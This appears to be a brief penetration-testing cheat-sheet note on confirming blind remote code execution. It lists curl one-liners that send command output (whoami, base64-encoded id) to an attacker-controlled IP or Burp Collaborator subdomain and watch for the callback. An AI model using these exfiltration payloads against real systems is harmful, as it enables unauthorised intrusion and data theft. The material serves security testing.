# Curl - For Blind RCE or Code Injections

`curl http://attacker_IP/'whoami'`

or

`curl http://<your_subdomain>.burpcollaborator.net/'whoami'`

Monitor with WireShark on your IP or monitor Collaborator client to see if request was made by the server and if code execution was successful.

Can use base64 encoding to allow for spaces to be included in data sent by server:

`curl http://<your_subdomain>.burpcollaborator.net/'id|base64'`